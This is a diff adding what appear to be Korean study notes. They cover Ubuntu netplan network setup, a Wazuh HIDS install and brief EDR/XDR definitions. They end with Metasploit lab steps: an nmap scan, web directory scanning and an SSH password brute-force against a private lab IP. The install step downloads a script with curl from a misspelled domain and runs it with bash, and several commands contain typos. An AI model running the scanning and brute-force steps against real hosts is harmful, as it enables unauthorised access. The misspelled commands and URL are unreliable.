@@ -1,0 +1,89 @@
+
+########################
+# 수동설정시
+ls -l /etc/netplan/
+/etc/netplan
+sudo vi 00-installer-config.yaml
+sudo vi /etc/netplan/00-installer-config.yaml
+
+# 3. 보안을 위해 파일 권한 변경 (600)
+sudo chmod 600 /etc/netplan/00-installer-config.yaml
+
+network:
+  version: 2
+  renderer: networkd
+  ethernets:
+    enp0s3:
+      dhcp4: true
+
+
+sudo chmod 600 00-installer-config.yaml
+# 1. 넷플랜 설정에 문법 오류가 없는지 먼저 테스트 (안전장치)
+sudo netplan try
+
+# 2. 넷플랜 설정 적용 (정상적이라면 리스타트 효과를 냅니다)
+sudo netplan apply
+
+# 3. 네트워크 관리 서비스(systemd-networkd) 강제 재시작
+sudo systemctl restart systemd-networkd
+
+# 4. (선택사항) 전체 네트워크 매니저 서비스 재시작
+sudo systemctl restart NetworkManager
+
+# 저장소의 최신 패키지 목록 가져오기 (필수)
+sudo apt update
+
+# 설치된 패키지들을 최신 버전으로 업그레이드 (선택)
+sudo apt upgrade -y
+
+sudo apt install iputils-ping -y
+
+# OpenSSL 및 개발에 필요한 라이브러리 함께 설치
+sudo apt install openssl libssl-dev -y
+
+Server H-IDS 유형의 오픈소스 솔루션
+
+sudo curl -sO https://packeges.wazuh.com/4.9/wazuh-install.sh
+ls
+sudo bash ./wazuh-install.sh -a
+sudo systmemctl damon-reload
+admin /passwd
+대시보드 세팅 후에 클라이언트 우분투 하나 더 설계
+
+EDR (Endpoint Detection and Response)
+한 줄 요약: 엔드포인트(PC, 서버, 가상머신 등) 내부를 샅샅이 감시하는 'CCTV 사각지대 없는 감시관'입니다
+
+XDR (Extended Detection and Response)
+한 줄 요약: EDR을 넘어서 네트워크, 방화벽, 클라우드, 이메일 등 보안 인프라 전체를 하나로 묶어 감시하는 '통합 관제 사령탑'입니다.
+
+#####쉘 스크립트 가장 중요한 명령어 정리좀
+
+
+메타스플로잇
+sudo mfsconsole
+
+# 데이터베이스 시작 (선택 사항이지만 권장)
+sudo systemctl start postgresql
+
+msf6 > db_nmap -sV -sC -O 172.16.11.223
+
+# 1. 웹 디렉토리 찾기 모듈 선택
+msf > use auxiliary/scanner/http/dir_scanner
+
+# 2. 타겟 세팅
+msf auxiliary(scanner/http/dir_scanner) > set RHOSTS 172.16.11.223
+
+# 3. 실행
+msf auxiliary(scanner/http/dir_scanner) > run
+
+# SSH 무차별 대입 모듈 선택
+msf > use auxiliary/scanner/ssh/ssh_login
+
+# 타겟 및 유저 설정
+msf auxiliary(scanner/ssh/ssh_login) > set RHOSTS 172.16.11.223
+msf auxiliary(scanner/scanner/ssh/ssh_login) > set USERNAME <찾은_유저이름>
+
+# 칼리에 내장된 기본 패스워드 사전 파일 지정
+msf auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/metasploit/password.lst
+
+msf auxiliary(scanner/ssh/ssh_login) > run
